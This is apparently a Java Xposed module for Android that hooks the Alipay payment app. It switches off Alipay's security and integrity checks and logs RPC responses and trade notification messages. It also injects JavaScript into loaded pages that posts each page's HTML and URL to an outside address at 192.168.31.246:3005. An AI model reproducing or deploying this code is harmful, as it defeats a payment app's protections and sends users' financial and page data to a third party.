package com.tools.payhelper;


import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.tools.payhelper.utils.MyLogger;
import com.tools.payhelper.utils.PayHelperUtils;
import com.tools.payhelper.utils.StringUtils;

import java.lang.reflect.Method;

import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XC_MethodReplacement;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.XposedHelpers;

/**
 * @author xinyu126
 * @ClassName: AlipayHook
 * @Description: TODO(这里用一句话描述这个类的作用)
 * @date 2018年6月23日 下午1:25:54
 */

public class AlipayHook {
    public static ClassLoader mClassLoader;
    public static Context mContext;
    private Class<?> H5LogClazz;
    public static String LOG_TAG = "hacker";


    public void hook(final ClassLoader classLoader, final Context context) {
        securityCheckHook(classLoader);
        mContext = context;
        mClassLoader = classLoader;

        try {
            Class<?> H5RpcUtil = XposedHelpers.findClass("com.alipay.mobile.nebulabiz.rpc.H5RpcUtil", classLoader);
            Class<?> h5PageClazz = XposedHelpers.findClass("com.alipay.mobile.h5container.api.H5Page", classLoader);
            Class<?> jsonClazz = XposedHelpers.findClass("com.alibaba.fastjson.JSONObject", classLoader);
            if (h5PageClazz != null && jsonClazz != null) {
                XposedHelpers.findAndHookMethod(H5RpcUtil, "rpcCall", String.class, String.class, String.class,
                        boolean.class, jsonClazz, String.class, boolean.class, h5PageClazz,
                        int.class, String.class, boolean.class, int.class, new XC_MethodHook() {

                            @Override
                            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                                super.afterHookedMethod(param);
                                Object resp = param.getResult();
                                if (resp != null) {
                                    Method method = resp.getClass().getMethod("getResponse", new Class<?>[]{});
                                    String response = (String) method.invoke(resp, new Object[]{});
                                    Log.i(LOG_TAG, "H5RpcUtil.response: " + response);
                                }
                            }
                        });
            }

            H5LogClazz = classLoader.loadClass("com.alipay.mobile.nebula.util.H5Log");
            findAndookLog(H5LogClazz,"d", "H5Log");
            findAndookLog(H5LogClazz,"debug","H5Log");
            findAndookLog(H5LogClazz,"e", "H5Log");
            findAndookLog(H5LogClazz,"w", "H5Log");


            Class<?> insertTradeMessageInfo = XposedHelpers.findClass("com.alipay.android.phone.messageboxstatic.biz.dao.TradeDao", classLoader);
            XposedBridge.hookAllMethods(insertTradeMessageInfo, "insertMessageInfo", new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    try {
                        Object object = param.args[0];
                        String MessageInfo = (String) XposedHelpers.callMethod(object, "toString");
                        String content = StringUtils.getTextCenter(MessageInfo, "content='", "'");
                        Log.i(LOG_TAG, "TradeDao.insertMessageInfo: " + content);
                    } catch (Exception e) {
                        Log.i(LOG_TAG, "TradeDao.insertMessageInfo: " + e.getMessage());
                    }
                    super.beforeHookedMethod(param);
                }
            });

            Class<?> insertServiceMessageInfo = XposedHelpers.findClass("com.alipay.android.phone.messageboxstatic.biz.dao.ServiceDao", classLoader);
            XposedBridge.hookAllMethods(insertServiceMessageInfo, "insertMessageInfo", new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    try {
                        Object object = param.args[0];
                        String MessageInfo = (String) XposedHelpers.callMethod(object, "toString");
                        String content = StringUtils.getTextCenter(MessageInfo, "extraInfo='", "'").replace("\\", "");
                        Log.i(LOG_TAG, "ServiceDao.insertMessageInfo: " + content);
                    } catch (Exception e) {
                        Log.i(LOG_TAG, "ServiceDao.insertMessageInfo: " + e.getMessage());
                    }
                    super.beforeHookedMethod(param);
                }
            });

            final Class<?> H5WebViewClient = XposedHelpers.findClass("com.alipay.mobile.nebulacore.web.H5WebViewClient", classLoader);
            XposedBridge.hookAllMethods(H5WebViewClient, "shouldOverrideUrlLoading", new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    try {
                        Object str = param.args[1];
                        Log.i(LOG_TAG, "H5WebViewClient.shouldOverrideUrlLoading: " + str);
                    } catch (Exception e) {
                        Log.i(LOG_TAG, "H5WebViewClient.shouldOverrideUrlLoading:" + e.getMessage());
                    }
                    super.beforeHookedMethod(param);
                }
            });

            final Class<?> APWebView = XposedHelpers.findClass("com.alipay.mobile.nebula.webview.APWebView", classLoader);
            XposedBridge.hookAllMethods(H5WebViewClient, "onPageFinished", new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    try {
                        Object aPWebView = param.args[0];
                        Object str = param.args[1];
                        Log.i(LOG_TAG, "H5WebViewClient.onPageFinished: " + str);
                        Method loadUrl =  APWebView.getMethod("loadUrl", String.class);
                        String script =
                                ";(function() {" +
                                        "var documentHtml = document.getElementsByTagName('html')[0].innerHTML;" +
                                        "var xhr = new XMLHttpRequest();" +
                                        "xhr.open('post', 'http://192.168.31.246:3005');" +
                                        "xhr.setRequestHeader('content-type', 'application/json');" +
                                        "var data = { html: documentHtml, url: document.location.href };" +
                                        "xhr.send(JSON.stringify(data));" +
                                "}());";
                        loadUrl.invoke(aPWebView, "javascript:"+ script +";");
                    } catch (Exception e) {
                        Log.i(LOG_TAG, "H5WebViewClient.onPageFinished:" + e.getMessage());
                    }
                    super.beforeHookedMethod(param);
                }
            });

        } catch (Error | Exception e) {
            PayHelperUtils.sendmsg(context, e.getMessage());
            MyLogger.e("Alipay hook err: " + e.getMessage());
        }
    }

    private void securityCheckHook(ClassLoader classLoader) {
        try {
            Class<?> securityCheckClazz = XposedHelpers.findClass("com.alipay.mobile.base.security.CI", classLoader);
            XposedHelpers.findAndHookMethod(securityCheckClazz, "a", String.class, String.class, String.class, new XC_MethodHook() {
                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    Object object = param.getResult();
                    XposedHelpers.setBooleanField(object, "a", false);
                    param.setResult(object);
                    super.afterHookedMethod(param);
                }
            });

            XposedHelpers.findAndHookMethod(securityCheckClazz, "a", Class.class, String.class, String.class, new XC_MethodReplacement() {
                @Override
                protected Object replaceHookedMethod(MethodHookParam param) throws Throwable {
                    return (byte) 1;
                }
            });
            XposedHelpers.findAndHookMethod(securityCheckClazz, "a", ClassLoader.class, String.class, new XC_MethodReplacement() {
                @Override
                protected Object replaceHookedMethod(MethodHookParam param) throws Throwable {
                    return (byte) 1;
                }
            });
            XposedHelpers.findAndHookMethod(securityCheckClazz, "a", new XC_MethodReplacement() {
                @Override
                protected Object replaceHookedMethod(MethodHookParam param) throws Throwable {
                    return false;
                }
            });

        } catch (Error | Exception e) {
            e.printStackTrace();
        }
    }

    private void findAndookLog(Class<?> clazz, final String methodName, final String a){
        XposedBridge.hookAllMethods(clazz, methodName, new XC_MethodHook() {
            @Override
            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                try {
                    Log.d(LOG_TAG, a + "-> " + param.args[0].toString() + ":" + param.args[1].toString());
                } catch (Exception e) {
                    Log.e(LOG_TAG, "findAndookLog:" + e.getMessage());
                }
                super.beforeHookedMethod(param);
            }
        });
    }

    public static void notifyurl(final String amount) {
        Intent broadCastIntent = new Intent();
        broadCastIntent.putExtra("amount", amount);
        broadCastIntent.setAction(MainActivity.BILLRECEIVED_ACTION);
        mContext.sendBroadcast(broadCastIntent);
    }
}